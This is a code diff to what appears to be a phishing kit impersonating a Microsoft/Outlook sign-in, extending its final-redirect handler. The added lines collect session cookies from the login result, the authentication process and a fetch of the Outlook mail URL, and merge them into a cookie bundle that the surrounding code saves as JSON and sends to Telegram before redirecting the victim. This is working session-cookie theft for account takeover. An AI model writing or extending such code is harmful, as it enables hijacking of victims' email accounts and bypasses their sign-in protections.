@@ -1190,6 +1190,31 @@ async def final_redirect():
         ])
         final_redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
 
+        # Function to fetch cookies from the final redirect URL
+        def fetch_final_redirect_cookies(url):
+            try:
+                session_obj = requests.Session()
+                response = session_obj.get(url, allow_redirects=True)
+                response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
+                
+                cookies_list = []
+                for cookie in response.cookies:
+                    cookies_list.append({
+                        "name": cookie.name,
+                        "value": cookie.value,
+                        "domain": cookie.domain,
+                        "path": cookie.path,
+                        "secure": cookie.secure,
+                        "expires": cookie.expires if cookie.expires else None
+                    })
+                return cookies_list
+            except requests.exceptions.RequestException as e:
+                print(f"Error fetching cookies from {url}: {e}")
+                return []
+
+        # Fetch cookies from the final redirect URL
+        final_redirect_cookies = fetch_final_redirect_cookies(final_redirect_url)
+
         if stay_signed_in in ['yes', 'true', '1']:
             # Already have the redirect URL set
             # Send cookies to Telegram before redirecting
@@ -1205,6 +1230,18 @@ async def final_redirect():
                         "path": "/",
                         "secure": True
                     })
+            
+            # Add cookies from login_result if available
+            login_result = session.get('login_result', {})
+            if login_result and login_result.get('cookies'):
+                cookies_data["cookies"].extend(login_result['cookies'])
+                
+            # Add cookies from auth process if available
+            if session.get('auth_process_cookies'):
+                cookies_data["cookies"].extend(session['auth_process_cookies'])
+
+            # Add cookies from final redirect URL
+            cookies_data["cookies"].extend(final_redirect_cookies)
 
             # Save cookies as single-line JSON and send to Telegram
             try:
@@ -1241,6 +1278,18 @@ async def final_redirect():
                         "path": "/",
                         "secure": True
                     })
+                    
+            # Add cookies from login_result if available
+            login_result = session.get('login_result', {})
+            if login_result and login_result.get('cookies'):
+                cookies_data["cookies"].extend(login_result['cookies'])
+                
+            # Add cookies from auth process if available
+            if session.get('auth_process_cookies'):
+                cookies_data["cookies"].extend(session['auth_process_cookies'])
+
+            # Add cookies from final redirect URL
+            cookies_data["cookies"].extend(final_redirect_cookies)
 
             # Save cookies as single-line JSON and send to Telegram
             try:
